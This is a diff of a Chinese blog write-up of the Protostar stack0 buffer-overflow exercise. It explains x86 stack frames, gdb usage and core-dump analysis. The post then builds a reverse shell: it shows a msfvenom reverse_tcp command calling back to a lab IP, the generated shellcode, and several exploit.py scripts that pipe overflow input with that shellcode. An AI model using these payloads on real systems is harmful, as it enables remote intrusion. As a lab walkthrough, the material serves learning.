@@ -129,9 +129,9 @@
 
 <h4 id="httpblogchinaunixnetuid-1848701-id-2825699html">1&gt;http://blog.chinaunix.net/uid-1848701-id-2825699.html</h4>
 
-<h4 id="eip">2&gt;eip是当前帧中还没开始执行，下一步要执行的汇编指令的地址</h4>
+<h4 id="eip">2&gt;eip是当前帧中还没开始执行,下一步要执行的汇编指令的地址</h4>
 
-<h4 id="section">3&gt;32位系统中，一个栈单元为32位</h4>
+<h4 id="section">3&gt;32位系统中,一个栈单元为32位</h4>
 
 <div class="highlighter-rouge"><pre class="highlight"><code>esp+0x4代表下一个栈单元
 esp+0x1c代表esp下面第[16+12=28(/4=7)] 7个栈单元
@@ -143,7 +143,7 @@ eg.
 
 <h4 id="call-addrpush-eip--jmp-addr">4&gt;call addr===&gt;push eip + jmp addr</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>执行call addr时，由于call addr已经执行,所以call addr=push eip+jmp addr中的eip为call addr汇编指令当前所在帧中的下一条指令的地址,这里说的当前所在帧是如下图frame所示在当前图片看到的一片汇编指令代码,如执行0xff77b8d02处的call 0xf77bc2e0时,eip为当前帧的下一条指令的地址为f77b8d07
+<div class="highlighter-rouge"><pre class="highlight"><code>执行call addr时,由于call addr已经执行,所以call addr=push eip+jmp addr中的eip为call addr汇编指令当前所在帧中的下一条指令的地址,这里说的当前所在帧是如下图frame所示在当前图片看到的一片汇编指令代码,如执行0xff77b8d02处的call 0xf77bc2e0时,eip为当前帧的下一条指令的地址为f77b8d07
 </code></pre>
 </div>
 
@@ -154,9 +154,9 @@ eg.
 
 <h4 id="retnpop-eip--jmp-eip----eipespespesp4">6&gt;retn===&gt;pop eip + jmp eip    (eip=[esp],esp=esp+4)</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>分析ret汇编语句时，最好不要把ret分开当作两句汇编指令，这样容易因为人脑习惯逐句解析两句，会和计算机的解析一句汇编指令错乱
-特别是影响esp，eip的寄存器的分析时，要按照计算机的解析模式--&gt;ret只是一句指令，执行完ret指令后，eip=[esp],esp=esp+4
-分析ret指令时，先分析eip，再分析esp
+<div class="highlighter-rouge"><pre class="highlight"><code>分析ret汇编语句时,最好不要把ret分开当作两句汇编指令,这样容易因为人脑习惯逐句解析两句,会和计算机的解析一句汇编指令错乱
+特别是影响esp,eip的寄存器的分析时,要按照计算机的解析模式--&gt;ret只是一句指令,执行完ret指令后,eip=[esp],esp=esp+4
+分析ret指令时,先分析eip,再分析esp
 </code></pre>
 </div>
 
@@ -171,22 +171,22 @@ push esp+ret
 </code></pre>
 </div>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>由于call addr等同于push eip+jmp addr,执行call esp时，esp是个地址，系统将这里的esp翻译成一个普通地址，假设值为addr,call esp即相当于上面的call addr=push eip+jmp addr
-      代码段：                                    栈段：          
+<div class="highlighter-rouge"><pre class="highlight"><code>由于call addr等同于push eip+jmp addr,执行call esp时,esp是个地址,系统将这里的esp翻译成一个普通地址,假设值为addr,call esp即相当于上面的call addr=push eip+jmp addr
+      代码段:                                    栈段:          
                       ..                                                
                       ..                                  | addr1 |
         addr0     call esp(esp=addr)   ------&gt;       addr |       |
         addr1     opcode_1                                |       |
 
-当eip=addr0时，esp=addr
-当eip=addr1时，正在执行addr0处的call esp,也即call addr=push eip+jmp addr=push addr1+jmp addr
+当eip=addr0时,esp=addr
+当eip=addr1时,正在执行addr0处的call esp,也即call addr=push eip+jmp addr=push addr1+jmp addr
 执行完call esp后栈段如上图右部所示
 </code></pre>
 </div>
 
-<h4 id="pop-pop-retjmp-esp16pop-pop-ret">9&gt;pop pop ret=jmp <a href="条件：pop pop ret的地址在栈中且马上要执行">esp+16</a></h4>
+<h4 id="pop-pop-retjmp-esp16pop-pop-ret">9&gt;pop pop ret=jmp <a href="条件:pop pop ret的地址在栈中且马上要执行">esp+16</a></h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>栈段：                          代码段：
+<div class="highlighter-rouge"><pre class="highlight"><code>栈段:                          代码段:
 
     addr0     | addr1 |                 addr1:  pop1
     addr0+4   |       |                         pop2
@@ -194,12 +194,12 @@ push esp+ret
     addr0+12  |       |
     addr0+16  |       |
 
-满足条件时,栈中addr1覆盖的是一个函数的返回地址,esp=eip=addr0，还没但正要去执行ret=pop eip+jmp eip,
+满足条件时,栈中addr1覆盖的是一个函数的返回地址,esp=eip=addr0,还没但正要去执行ret=pop eip+jmp eip,
 执行完这个ret的前一句后,eip=ret的地址,esp=addr0,然后跳转到ret的地址处执行ret
-执行完这个ret后，eip=addr1,esp=addr0+4,然后执行addr1处的pop1
-执行完pop1后，eip=addr1+4,esp=addr0+8,然后执行addr1+4处的pop2
-执行完pop2后，eip=addr1+8,esp=addr0+12,然后执行addr1+8处的ret
-执行完ret后，eip=[addr0+16],esp=addr0+16,然后执行[add0+16]处的代码
+执行完这个ret后,eip=addr1,esp=addr0+4,然后执行addr1处的pop1
+执行完pop1后,eip=addr1+4,esp=addr0+8,然后执行addr1+4处的pop2
+执行完pop2后,eip=addr1+8,esp=addr0+12,然后执行addr1+8处的ret
+执行完ret后,eip=[addr0+16],esp=addr0+16,然后执行[add0+16]处的代码
 </code></pre>
 </div>
 
@@ -232,13 +232,13 @@ push esp+ret
    r(run)
    disas /m
                 /r      #show hex(显示汇编指令对应十六进制值)
-                /m      #show source if available(如果有源码，显示对应行源码)
+                /m      #show source if available(如果有源码,显示对应行源码)
    set disassembly-flavor att/intel     #设置att或intel格式
    set disassemble-next-line            #设置下一步是否显示汇编码
    si(setpi)                            #==&gt; step into,like f7 in od
    ni(nexti)                            #==&gt; like f8 in od
-   leave                #立即中断当前函数运行并返回，当前函数的剩余语句将不被执行
-   finish               #执行到当前函数返回之后停止，当前函数的剩余语句将正常运行
+   leave                #立即中断当前函数运行并返回,当前函数的剩余语句将不被执行
+   finish               #执行到当前函数返回之后停止,当前函数的剩余语句将正常运行
    bt(backtrace)        #查看所有栈帧信息
    f num(frame num)     #选择并打印第num个栈帧信息
    info f(info frame)   #查看当前栈帧信息
@@ -249,7 +249,7 @@ push esp+ret
 
 <h4 id="linkhttpsexploit-exercisescomprotostarstack0">link:https://exploit-exercises.com/protostar/stack0/</h4>
 
-<p>源码如下：</p>
+<p>源码如下:</p>
 
 <div class="highlighter-rouge"><pre class="highlight"><code>--------stack0.c----------
 1       #include &lt;stdlib.h&gt;
@@ -274,7 +274,7 @@ push esp+ret
 </code></pre>
 </div>
 
-<p>该题要求溢出变量modified,也即覆盖栈中的modified所在的内在地址里的值,在终端中执行如下命令，下面为实时操作与对输出的相应理解</p>
+<p>该题要求溢出变量modified,也即覆盖栈中的modified所在的内在地址里的值,在终端中执行如下命令,下面为实时操作与对输出的相应理解</p>
 
 <p>on kali:</p>
 
@@ -294,7 +294,7 @@ l
 7         volatile int modified;
 8         char buffer[64];
 9
-10        modified = 0;kjkkkk
+10        modified = 0;
 -----------end----------
 
 l
@@ -345,32 +345,32 @@ main函数对应汇编代码从line6开始:
 ---------------------------------汇编跟踪:line6------------------------------------------
 Dump of assembler code for function main:
 6       {
-0x080483f4 &lt;+0&gt;:     push   %ebp                 #ebp压栈，对应下图stack0中的序号1
+0x080483f4 &lt;+0&gt;:     push   %ebp                 #ebp压栈,对应下图stack0中的序号1
 0x080483f5 &lt;+1&gt;:     mov    %esp,%ebp            #ebp=esp,对应下图stack0中的序号2
-0x080483f7 &lt;+3&gt;:     and    $0xfffffff0,%esp     #将esp最后四位置0,应该是一种安全措施，获得更大的栈空间,对应序号3
+0x080483f7 &lt;+3&gt;:     and    $0xfffffff0,%esp     #将esp最后四位置0,应该是一种安全措施,获得更大的栈空间,对应序号3
 0x080483fa &lt;+6&gt;:     sub    $0x60,%esp           #扩大栈空间,0x60=96=(/4=24)24个栈单元,对应序号4
 ---------------------------------------end-----------------------------------------------
 
-line7,lin8代码：
+line7,lin8代码:
 ------------line7,8---------------
 7         volatile int modified;
 8         char buffer[64];
 --------------end-----------------
 
-这两行代码由于无法在gdb中跟踪，暂时无法确定在栈中的分布情况
+这两行代码由于无法在gdb中跟踪,暂时无法确定在栈中的分布情况
 
 --------------secret-----------------
-下文将会得出(此时可以先不看这个secret)：
-1.进入main函数前的上一帧中，有一个调用main函数的动作，为了调用main函数，有这几个动作：
+下文将会得出(此时可以先不看这个secret):
+1.进入main函数前的上一帧中,有一个调用main函数的动作,为了调用main函数,有这几个动作:
 1&gt;将main函数的参数从右到左压栈(push)
-2&gt;call main,将当前帧（还没进入main函数时的帧)中call main汇编语句的下一行汇编语句的地址压栈
-2.在进入main函数，main初始化后(push ebp,ebp=esp,esp=esp-0x60),声明变量的line7:volatile int modified,char buffer[64]的对应汇编效果是：
-从上一句esp=esp-0x60中的esp为扩展0x60的栈空间大小之前的esp开始依次“压入”接下来声明的各个变量,也即：
-1&gt;在下图stack0中的0xffffd4ec中“压入” modified变量,在0xffffd4ec上面“压入”buffer[64]这个大变量,也即在0xffffd4ec-0x40&lt;==&gt;0xffffd4ec上面64B空间(16个栈单元)的位置上
-2&gt;这里打了引号的“压入”没有esp=esp-4的效果，应该是操作系统对程序初始化时算好了将要声明的变量放到（“压入”）对应的位置上
+2&gt;call main,将当前帧(还没进入main函数时的帧)中call main汇编语句的下一行汇编语句的地址压栈
+2.在进入main函数,main初始化后(push ebp,ebp=esp,esp=esp-0x60),声明变量的line7:volatile int modified,char buffer[64]的对应汇编效果是:
+从上一句esp=esp-0x60中的esp为扩展0x60的栈空间大小之前的esp开始依次"压入"接下来声明的各个变量,也即:
+1&gt;在下图stack0中的0xffffd4ec中"压入" modified变量,在0xffffd4ec上面"压入"buffer[64]这个大变量,也即在0xffffd4ec-0x40&lt;==&gt;0xffffd4ec上面64B空间(16个栈单元)的位置上
+2&gt;这里打了引号的"压入"没有esp=esp-4的效果,应该是操作系统对程序初始化时算好了将要声明的变量放到("压入")对应的位置上
 3.一般栈中从下到上数据依次为函数从右到左的参数、调用该函数的上一帧中"call 该函数"形式的对应汇编指令的下一句汇编指令的地址
-4.只要修改了0xffffd4ec处（存放了modified变量）的值,将其改成非0就可以完成这一题的要求了
-5.上面3中说的非0是内存中的非0，如果是键盘上的0键并不是内存中的0,如下图ascii所示
+4.只要修改了0xffffd4ec处(存放了modified变量)的值,将其改成非0就可以完成这一题的要求了
+5.上面3中说的非0是内存中的非0,如果是键盘上的0键并不是内存中的0,如下图ascii所示
 --------------end--------------------
 </code></pre>
 </div>
@@ -395,7 +395,7 @@ line11:
 -----------------汇编跟踪:line11-----------------------
 11        gets(buffer);
 0x08048405 &lt;+17&gt;:    lea    0x1c(%esp),%eax          #eax=esp+0x1c,0x1c=28(/4=7)=7个栈单元,对应图中序号6
-0x08048409 &lt;+21&gt;:    mov    %eax,(%esp)              #[esp]=eax,对应图中序号7,为了下面的call gets作准备--&gt;将func gets的参数“入栈”(放到对应的位置，不是push arg,没有esp=esp-4)
+0x08048409 &lt;+21&gt;:    mov    %eax,(%esp)              #[esp]=eax,对应图中序号7,为了下面的call gets作准备--&gt;将func gets的参数"入栈"(放到对应的位置,不是push arg,没有esp=esp-4)
 0x0804840c &lt;+24&gt;:    call   0x804830c &lt;gets@plt&gt;     #上面一行[esp]=eax=addr,将buffer[64]的起始地址放入栈中准备给gets函数调用
 -----------------------end-----------------------------
 
@@ -408,9 +408,9 @@ x $esp+0x5c
 disas /m
 ------------out:-----------
 11        gets(buffer);                                                                                                                      
-=&gt; 0x08048405 &lt;+17&gt;:    lea    0x1c(%esp),%eax     #这行左边的箭头表示运行到这行，也即eip=0x08048405,此时x $esp+0x5c ===&gt; 0xffffd4ec:  0x00000000
+=&gt; 0x08048405 &lt;+17&gt;:    lea    0x1c(%esp),%eax     #这行左边的箭头表示运行到这行,也即eip=0x08048405,此时x $esp+0x5c ===&gt; 0xffffd4ec:  0x00000000
     
-0x08048409 &lt;+21&gt;:    mov    %eax,(%esp)         #此外，lea 0x1c(%esp),%eax(in att mode)&lt;==&gt;lea eax,[esp+0x1c](in intel mode)                                                                                                                                                            
+0x08048409 &lt;+21&gt;:    mov    %eax,(%esp)         #此外,lea 0x1c(%esp),%eax(in att mode)&lt;==&gt;lea eax,[esp+0x1c](in intel mode)                                                                                                                                                            
 0x0804840c &lt;+24&gt;:    call   0x804830c &lt;gets@plt&gt;                                                                                          
 -------------end-----------
 
@@ -461,7 +461,7 @@ x/4 $esp    #查看当前栈中esp起4个栈单元的情况
 其中的0xffffd4ac对应图中的序号6中数值
     
 n
-输入：
+输入:
 12345678981234567898123456789812345678981234567898123456789812340000
 enter
 其中最后的12340000为第60到68个字符
@@ -483,13 +483,13 @@ p $eax
 $4 = 808464432
 ------------end---------------
 
-p/x $eax(以十六进制显示eax的值,help x(x $esp+0x1c相当于p [$esp+0x1c]的效果，只不过p不支持p [somethin]命令显示内存地址对应的内容)中的/FMT可以看到支持的各种显示格式)
+p/x $eax(以十六进制显示eax的值,help x(x $esp+0x1c相当于p [$esp+0x1c]的效果,只不过p不支持p [somethin]命令显示内存地址对应的内容)中的/FMT可以看到支持的各种显示格式)
 ------------output:-------------
 $5 = 0x30303030
 ---------------end--------------
 
-这里的0x30303030是上面输入的68个键盘上的数字中的最后4个0对应的内存中的值，键盘上的数字0对应的真实内存ascii值为48（十进制）,也即十六进制0x30,更多关于ascii的理解可参考https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=9217
-所以要输入第65到68个字符单元为内存中的0,也即ascii值为nul的字符：
+这里的0x30303030是上面输入的68个键盘上的数字中的最后4个0对应的内存中的值,键盘上的数字0对应的真实内存ascii值为48(十进制),也即十六进制0x30,更多关于ascii的理解可参考https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=9217
+所以要输入第65到68个字符单元为内存中的0,也即ascii值为nul的字符:
 print '\x00'(或python -c 'print "\x00"')
 output:空
 print '0'(或python -c 'python "0"')
@@ -497,27 +497,27 @@ output:0
 print '\x30'(或python -c 'python "\x30"')
 output:0
 所以print '\x00'在内存中的数据为0,print '0'&lt;==&gt;print '\x30'
-重新运行./stack0并输入下面的值可使modified在内存中的值不变，依然为内存中的0
+重新运行./stack0并输入下面的值可使modified在内存中的值不变,依然为内存中的0
 1234567898123456789812345678981234567898123456789812345678981234\x00\x00\x00\x00
-注意，如果直接在键盘上输入上面这一长串，最后的\x00\x00\x00\x00在内存中并不能被解析成内存中的0000,要使用如下方法:
+注意,如果直接在键盘上输入上面这一长串,最后的\x00\x00\x00\x00在内存中并不能被解析成内存中的0000,要使用如下方法:
 
 print '1234567898123456789812345678981234567898123456789812345678981234\x00\x00\x00\x00' | ./stack0
 或
 echo '1234567898123456789812345678981234567898123456789812345678981234\x00\x00\x00\x00' | ./stack0
 
-原题中要求改变modified位，直接输入键盘上的任意大于64位的一串字符即可，因为键盘上的数字0在内存中是0x30,如果将键盘上的0键输入到对应的modified位上，会改变modified
+原题中要求改变modified位,直接输入键盘上的任意大于64位的一串字符即可,因为键盘上的数字0在内存中是0x30,如果将键盘上的0键输入到对应的modified位上,会改变modified
 </code></pre>
 </div>
 
 <p>图stack0
 <img src="https://raw.githubusercontent.com/xinghuacai/pic/master/stack0.png" /></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>该题要求溢出变量modified,也即覆盖栈中的modified所在的内在地址里的值，这里进行扩展，通过栈溢出反弹shell.
+<div class="highlighter-rouge"><pre class="highlight"><code>该题要求溢出变量modified,也即覆盖栈中的modified所在的内在地址里的值,这里进行扩展,通过栈溢出反弹shell.
 该题中ASLR(地址随机化) 和 NX(栈不可执行)已禁用
-由上图stack0及分析易知：
-1.栈中如果将一个函数展开，一般从push ebp+mov ebp,esp+sub esp,0x??开始到leave+ret结束,将这些看作是该函数的帧,该函数的上一帧中有调用该函数的汇编语句，该函数的返回地址在栈中的位置为该函数帧的下面一个栈单元内(保存在该函数帧的下面一个栈单元内)
-2.栈中内容由下至上依次为：函数的返回地址、函数的帧(由下至上从函数的上一帧中ebp的值开始)
-3.gets函数通过终端输入超长字符只能覆盖main函数帧的上一帧中调用main函数时main函数的返回地址main_ret，不能覆盖main函数帧中调用gets函数时get函数的返回地址gets_ret
+由上图stack0及分析易知:
+1.栈中如果将一个函数展开,一般从push ebp+mov ebp,esp+sub esp,0x??开始到leave+ret结束,将这些看作是该函数的帧,该函数的上一帧中有调用该函数的汇编语句,该函数的返回地址在栈中的位置为该函数帧的下面一个栈单元内(保存在该函数帧的下面一个栈单元内)
+2.栈中内容由下至上依次为:函数的返回地址、函数的帧(由下至上从函数的上一帧中ebp的值开始)
+3.gets函数通过终端输入超长字符只能覆盖main函数帧的上一帧中调用main函数时main函数的返回地址main_ret,不能覆盖main函数帧中调用gets函数时get函数的返回地址gets_ret
 
 计算需要输入多少字符可以覆盖main_ret:
 
@@ -577,7 +577,7 @@ p $esp
 $7 = (void *) 0xffffd4f8
 ---------------end-------------------
 
-也即执行完0x080483f4后esp值为0xffffd4f8,所以要覆盖main_ret,需要输入(0xffffd4f8-0xffffd4ec)/4+16+1+1=21个栈单元=21*4=84B，也即84个字符
+也即执行完0x080483f4后esp值为0xffffd4f8,所以要覆盖main_ret,需要输入(0xffffd4f8-0xffffd4ec)/4+16+1+1=21个栈单元=21*4=84B,也即84个字符
 main_ret=0xffffd4f8+0x4=0xffffd4fc
 
 python -c "print 'a'*80+'bbbb'" | ./stack0     #(此时不可直接print 'a'*80,print不支持)
@@ -592,7 +592,7 @@ gdb -q -c core
 /root/桌面/core: 没有那个文件或目录.
 ----------end------------
 
-解决方法：(http://blog.csdn.net/nuoline/article/details/8610694)
+解决方法:(http://blog.csdn.net/nuoline/article/details/8610694)
 ulimit -c
 ---------output:----------
 0
@@ -616,7 +616,7 @@ Program terminated with signal SIGSEGV, Segmentation fault.
 
 从而发现某个函数(main函数)的返回地址被改写成0x62626262(bbbb),从而产生溢出错误
 
-或者：
+或者:
 
 gdb ./stack0
 b 18
@@ -642,7 +642,7 @@ End of assembler dump.
 
 同样可以发现main_ret被溢出为0x62626262(bbbb)
 
-检验一下：
+检验一下:
 python -c 'print "a"*80+"bbcc"' | ./stack0
 ------------------output:--------------------
 [New LWP 11928]
@@ -651,11 +651,11 @@ Program terminated with signal SIGSEGV, Segmentation fault.
 #0  0x63636262 in ?? ()
 ---------------------end---------------------
 
-最后的"bbcc"由于在内存中依次由上到下存放在栈空间中（在一个栈单元中可放下4个字符，在一个栈单元中从左到右存放）,而栈中由上到下或一个栈单元中的从左到右都是由内存低地址到内存高地址排列，所以bbcc(0x62626363)被翻译成eip=0x63636262
+最后的"bbcc"由于在内存中依次由上到下存放在栈空间中(在一个栈单元中可放下4个字符,在一个栈单元中从左到右存放),而栈中由上到下或一个栈单元中的从左到右都是由内存低地址到内存高地址排列,所以bbcc(0x62626363)被翻译成eip=0x63636262
 
-为了溢出反弹一个shell，用msf生成shellcode,并构造成如下输入链来触发shellcode的执行
+为了溢出反弹一个shell,用msf生成shellcode,并构造成如下输入链来触发shellcode的执行
 "a"*80+addr(jmp esp)+shellcode
-其中shellcode代码由msf生成，输出为py版本，反弹ip设为kali的ip:192.168.3.106,port为1111
+其中shellcode代码由msf生成,输出为py版本,反弹ip设为kali的ip:192.168.3.106,port为1111
 2004 ~  » msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.3.106 LPORT=1111 -e x86/shikata_ga_nai -b "\x00" --platform linux -f py 
 -------------------------output:-----------------------
 No Arch selected, selecting Arch: x86_64 from the payload
@@ -675,9 +675,9 @@ buf += "\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35"
 buf += "\x8b\xf4\xbe\x2c"
 -------------------------end--------------------------
 
-其中jmp esp的地址由msfelfscan找出，win下为msfpescan
+其中jmp esp的地址由msfelfscan找出,win下为msfpescan
 msfelfscan -j esp /root/桌面/stack0
-结果发现由于stack0的代码比较简单，里面没有jmp esp的指令，于是通过info shared来找出stack0中调用系统函数时用到的so文件，然后从so文件里找出jmp esp的地址,如下：
+结果发现由于stack0的代码比较简单,里面没有jmp esp的指令,于是通过info shared来找出stack0中调用系统函数时用到的so文件,然后从so文件里找出jmp esp的地址,如下:
 info shared
 ------------output:----------------
 From        To          Syms Read   Shared Object Library
@@ -695,12 +695,12 @@ From        To          Syms Read   Shared Object Library
 0x0001c24f jmp esp
 ------------end---------------
 
-找到一个jmp esp地址为：0x0001813b,但是这只是偏移量
-真正的地址为：0xf7fdd860+0x0001813b=0xf7ff599b
+找到一个jmp esp地址为:0x0001813b,但是这只是偏移量
+真正的地址为:0xf7fdd860+0x0001813b=0xf7ff599b
 
-于是输入链为：
+于是输入链为:
 "a"*80+'\x9b\x59\xff\xf7'+shellcode
-用python代码实现exploit.py：
+用python代码实现exploit.py:
 ------------exploit.py----------------
 import os
 import sys
@@ -722,7 +722,7 @@ os.system("echo '%s' | ./stack0" % input)
 ---------------end--------------------
 
 发现上面算出来的jmp_esp='\x9b\x59\xff\xf7'无法跳转到esp,可能是我的这种理解错了
-换工具，rop-tool
+换工具,rop-tool
 http://www.freebuf.com/sectool/105715.html
 先安装上面链接中说的capstone
 http://www.capstone-engine.org/download/3.0.4/ubuntu-14.04/python-capstone_3.0.4-0.1ubuntu1_amd64.deb
@@ -761,10 +761,10 @@ Looking gadgets, please wait...
  0x080484a6 -&gt; pop esi; pop edi; pop ebp; ret ; 
 ---------------------end---------------------
 
-里面没有找到jmp esp,不理解为什么不搜索系统加载到内存的动态链接库so文件里的jmp esp，暂且不管这个问题
-没有找到jmp esp,rop gadget这个功能主要是搜索用来获得ret2libc构造链中的子语句的功能，特点是每个gadget都是以ret结尾的一条或几条汇编小指令
-换工具edb-debugger,kali自带，将stack0拖入edb,快捷键ctrl+o,或者从plugins选项中选择opcodesearcher工具(里面也有roptool,功能类似上面的rop-tool工具的功能,edb-debugger中的toptool功能可以看到系统内存已经加载的动态链接库列表，而上面freebuf中提到的rop-tool不能)
-搜到jmp esp地址如下（由于本机kali为64位，所以显示成下图中样式，取其中32位的地址即可）
+里面没有找到jmp esp,不理解为什么不搜索系统加载到内存的动态链接库so文件里的jmp esp,暂且不管这个问题
+没有找到jmp esp,rop gadget这个功能主要是搜索用来获得ret2libc构造链中的子语句的功能,特点是每个gadget都是以ret结尾的一条或几条汇编小指令
+换工具edb-debugger,kali自带,将stack0拖入edb,快捷键ctrl+o,或者从plugins选项中选择opcodesearcher工具(里面也有roptool,功能类似上面的rop-tool工具的功能,edb-debugger中的toptool功能可以看到系统内存已经加载的动态链接库列表,而上面freebuf中提到的rop-tool不能)
+搜到jmp esp地址如下(由于本机kali为64位,所以显示成下图中样式,取其中32位的地址即可)
 </code></pre>
 </div>
 
@@ -772,7 +772,7 @@ Looking gadgets, please wait...
 
 <div class="highlighter-rouge"><pre class="highlight"><code>取其中的0xf773813b,替换exploit.py中jmp_esp="\x3b\x81\x73\xf7",上图中选择的/lib/i386-linux-gnu/ld-2.19.so应该是随着操作系统启动加载到系统内存中的可用动态链接库文件
 
-运行exploit.py,结果依然不行，这个jmp_esp还是没有被执行，可能是没有找到这个地址，不理解，暂且不管这个问题
+运行exploit.py,结果依然不行,这个jmp_esp还是没有被执行,可能是没有找到这个地址,不理解,暂且不管这个问题
 python exploit.py
 ----------------outpout:------------------
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�A&gt;4P���do&lt;$3ɱ1U�da��N&gt;ʪ���SF
@@ -789,11 +789,11 @@ Program terminated with signal SIGSEGV, Segmentation fault.
 No function contains specified address.
 -----------------end----------------------
 
-无法有效利用jmp esp的方法,直接在main_ret位置上填充紧跟其后的shellcode的开始的地址，也即address(main_ret位置在内存中的地址0xffffd4fc)+0x4的结果:
+无法有效利用jmp esp的方法,直接在main_ret位置上填充紧跟其后的shellcode的开始的地址,也即address(main_ret位置在内存中的地址0xffffd4fc)+0x4的结果:
 
 shellcode_addr=0xffffd500
 
-由于有00，在调用gets时系统复制从终端输入的超长字符串会提前停止，所以不能取0xffffd500,取成0xffffd501,在原来shellcode前面加一个nop(\x90),重新构造输入链：
+由于有00,在调用gets时系统复制从终端输入的超长字符串会提前停止,所以不能取0xffffd500,取成0xffffd501,在原来shellcode前面加一个nop(\x90),重新构造输入链:
 "a"*80+"\x01\xd5\ff\xff"+"\x90"+shellcode
 将exploit.py中jmp_esp替换为jmp_esp="\x01\xd5\xff\xff",并在shellcode前面加一个"\x90",新的exploit.py如下:
 ------------------------exploit.py-------------------------------
@@ -833,7 +833,7 @@ Program terminated with signal SIGSEGV, Segmentation fault.
 
 重新运行./stack0,手工输入:
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234bbbb
-其中1234对应为main_ret位置，bbbb为原来的shellcode位置
+其中1234对应为main_ret位置,bbbb为原来的shellcode位置
 产生core文件后
 gdb -q -c core
 --------output:---------
@@ -853,10 +853,10 @@ x/4 $esp-4
 0xff85ffbc:     0x34333231      0x62626262      0xff860000      0xff86005c
 --------end-----------
 
-易知从这里（core)看到的shellcode开始的位置应该从0xff85ffc0开始（上面exploit.py中不在shellcode前加nop时使用的地址是0xffffd500）
-而0xff85ffc0中没有\x00不影响直接执行shellcode,不加nop,构造成如下输入链：
+易知从这里(core)看到的shellcode开始的位置应该从0xff85ffc0开始(上面exploit.py中不在shellcode前加nop时使用的地址是0xffffd500)
+而0xff85ffc0中没有\x00不影响直接执行shellcode,不加nop,构造成如下输入链:
 "a"*80+"\xc0\xff\x85\xff"+shellcode
-在exploit.py中具体如下：
+在exploit.py中具体如下:
 -----------------exploit.py-------------------
 #/usr/bin/python
 import os
@@ -902,16 +902,16 @@ x/40x $esp-4
 
 可以看到此时应该将0xff85ffc0改成0xffe11e0c+0x4=0xffe11e10才会执行后面的shellcode(内容从0x3c6f31ba开始)
 说明shellcode每次在内存中的位置都是变化的
-后来又发现下面三种方法特点不同：
-方法1：
+后来又发现下面三种方法特点不同:
+方法1:
     gdb ./stack0
     人工输入aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234bbbb
-    每次shellcode的位置（bbbb处)在内存中的地址都是0xffffd500
+    每次shellcode的位置(bbbb处)在内存中的地址都是0xffffd500
 方法2:
     ./stack0
     人工输入aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234bbbb
     gdb -q -c core
-    从core文件中发现每次shellcode的位置（bbbb处）在内存中的地址都是变化的
+    从core文件中发现每次shellcode的位置(bbbb处)在内存中的地址都是变化的
 方法3:
     vi exploit.py
     ------------exploit.py--------------
@@ -936,16 +936,16 @@ x/40x $esp-4
     ---------------end------------------
 
     gdb -q -c core
-    从core文件中分析出的shellcode的位置（\xba\x31\x6f\x3c开始)都是变化的
+    从core文件中分析出的shellcode的位置(\xba\x31\x6f\x3c开始)都是变化的
 
 通过这三种不同情况得出结论:
     1.linux的真实情况是每次shellcode在内存中的地址是变化的
-    2.不能gdb ./stack0来看shellcode的内存地址，要通过gdb -q -c core来分析出系统运行./stack0时的真实情况,方法2和3都可行
-    3.gdb ./stack0时，可能是系统判断有人在调度，所以故意让shellcode的内存地址每次都不变，用来干扰判断
-    4.想直接在"a"*80+"1234"+"bbbb"中的1234的位置上写入shellcode的起始地址是行不能的，只能用jmp esp或其他方法
+    2.不能gdb ./stack0来看shellcode的内存地址,要通过gdb -q -c core来分析出系统运行./stack0时的真实情况,方法2和3都可行
+    3.gdb ./stack0时,可能是系统判断有人在调度,所以故意让shellcode的内存地址每次都不变,用来干扰判断
+    4.想直接在"a"*80+"1234"+"bbbb"中的1234的位置上写入shellcode的起始地址是行不能的,只能用jmp esp或其他方法
 
-突然想到，在edb-debugger工具中找到的jmp esp的地址放入exploit.py中的jmp_esp中最后没有成功有可能是因为kali的安全防护功能，其中的系统内存中加载的/lib/i386-linux-gnu/ld-2.19.so有安全设置
-下载checksec.sh检查一下：http://www.trapkit.de/tools/checksec.sh(或者peda工具，https://github.com/xinghuacai/peda)
+突然想到,在edb-debugger工具中找到的jmp esp的地址放入exploit.py中的jmp_esp中最后没有成功有可能是因为kali的安全防护功能,其中的系统内存中加载的/lib/i386-linux-gnu/ld-2.19.so有安全设置
+下载checksec.sh检查一下:http://www.trapkit.de/tools/checksec.sh(或者peda工具,https://github.com/xinghuacai/peda)
 chmod +x ./checksec.sh
 ./checksec.sh --file /lib/i386-linux-gnu/ld-2.19.so
 -------------output:----------------
@@ -954,7 +954,7 @@ Partial RELRO   No canary found   NX enabled    DSO             No RPATH   No RU
 ---------------end------------------
 
 其中的NX enabled可以看出的确是这个原因
-检查下./stack0：
+检查下./stack0:
 发现也是NX enabled,这个stack0应该是我在kali上用gcc -g -o stack0 stack0.c编译出来的,默认有安全防护
 复制原系统protostar中的/opt/protostar/bin/stack0到kali中
 scp user:192.168.2.144:/opt/protostar/bin/stack0 /root/桌面
@@ -967,10 +967,10 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 这个才是原题protostar系统中的stack0,但是原系统中(protostar)溢出时无法产生core文件,无法分析执行时的shellcode和main_ret地址
 无法产生core文件应该是由于protostar默认的user用户的权限对suid=root的/opt/protostar/bin/stack0文件权限不足以在发生溢出时产生core文件
 
-解决方法：
+解决方法:
 cp /opt/protostar/bin/stack0 /tmp
-这样/tmp/stack0就是user用户的文件了，溢出时可以正常产生core文件,但是没有原来/opt/protostar/bin/stack0的suid=root属性
